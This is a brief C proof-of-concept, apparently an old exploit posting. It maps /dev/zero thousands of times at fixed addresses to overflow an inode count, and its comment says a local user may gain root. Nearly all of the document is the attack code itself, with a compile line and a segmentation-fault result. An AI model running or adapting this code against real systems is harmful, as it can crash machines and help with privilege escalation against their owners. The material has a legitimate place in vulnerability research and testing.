// INODE can be overflowed by mapping a single file too many times, 
allowing for a local user to possibly gain root access.
// gcc buffer.c -o buffer
// $ ./buffer   
// Segmentation Fault 


#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
void main(){
int fd, i;
fd = open("/dev/zero", O_RDONLY);
for(i = 0; i < 26999; i++){
mmap((char*)0x00000000 + (0x10000 * i), 1, PROT_READ, MAP_SHARED | 
MAP_FIXED, fd, 0);
}
}
